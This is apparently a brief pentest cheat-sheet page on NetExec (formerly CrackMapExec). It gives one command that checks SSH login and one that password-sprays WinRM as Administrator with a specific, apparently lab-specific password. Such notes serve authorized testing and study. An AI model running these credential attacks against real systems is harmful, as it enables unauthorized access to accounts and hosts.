---
description: Old CrackMapExec
icon: spider-black-widow
---

# NetExec

{% hint style="info" %}
<mark style="color:red;">`Check SSH access`</mark>

```sh
netexec ssh <IP> -u <USER> -p 'password'
```
{% endhint %}

***

{% hint style="info" %}
#### <mark style="color:red;">`Password Spray WinRM`</mark>

{% code overflow="wrap" %}
```sh
nxc winrm compatibility -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.' --no-bruteforce
```
{% endcode %}
{% endhint %}
